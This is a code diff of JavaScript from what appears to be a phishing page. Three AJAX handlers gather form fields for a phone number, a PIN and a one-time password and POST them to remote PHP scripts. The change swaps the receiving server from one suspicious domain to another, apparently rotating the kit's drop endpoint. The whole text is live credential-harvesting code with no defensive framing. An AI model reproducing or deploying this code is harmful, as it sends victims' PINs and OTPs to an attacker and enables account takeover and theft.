@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/bertus/one.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ii/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/bertus/two.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ii/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://chroedevsi.whf.bz/bertus/three.php',
+			  url: 'https://ww-zbi.cfd/uf5c2d/ii/three.php',
 			  data: dataString,
  
         
